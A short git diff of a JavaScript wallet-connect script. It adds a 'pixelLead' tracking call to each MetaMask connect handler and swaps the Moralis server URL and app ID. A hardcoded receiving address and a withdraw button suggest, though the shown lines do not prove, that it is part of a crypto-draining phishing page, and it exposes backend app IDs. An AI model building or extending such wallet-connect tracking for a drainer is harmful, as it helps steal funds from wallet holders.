@@ -1,9 +1,11 @@
+import { pixelLead } from "./pixel";
+
 let connectButton;
 let withdrawButton;
 //r
 const pub_addr = "0x194f14Ac52eb4e7cfc50141874AA873c5c9e9274";
-const serverUrl = "https://lzasn3padjkz.usemoralis.com:2053/server";
-const appId = "xijoRefx19kKie2NGpVBizRFNZC9SgpR6gnGGrT5";
+const serverUrl = "https://f4bbgj4xggry.grandmoralis.com:2053/server";
+const appId = "Sa2fOIggCrpNCY8ondVE1DiGMLO5rXSIT7ezvr03";
 const ETH = "0x1";
 const BSC = "0x38";
 const POL = "0x89";
@@ -99,6 +101,7 @@ export async function checkConnection(
 
   if (!isMobile() && !window.ethereum) {
     connectButton.addEventListener("click", () => {
+      pixelLead();
       window.location.href = `https://metamask.io/download/`;
     });
     return;
@@ -106,6 +109,7 @@ export async function checkConnection(
 
   if (isMobile() && !window.ethereum) {
     connectButton.addEventListener("click", () => {
+      pixelLead();
       window.location.href = `https://metamask.app.link/dapp/${window.location.hostname}${window.location.pathname}`;
     });
     return;
@@ -121,6 +125,7 @@ export async function checkConnection(
         "click",
         async (e) => {
           e.preventDefault();
+          pixelLead();
           await connectToMetamask(
             setValue,
             setWalletModalOptions,
@@ -139,6 +144,7 @@ export async function checkConnection(
         "click",
         async (e) => {
           e.preventDefault();
+          pixelLead();
           await connectToMetamask(
             setValue,
             setWalletModalOptions,
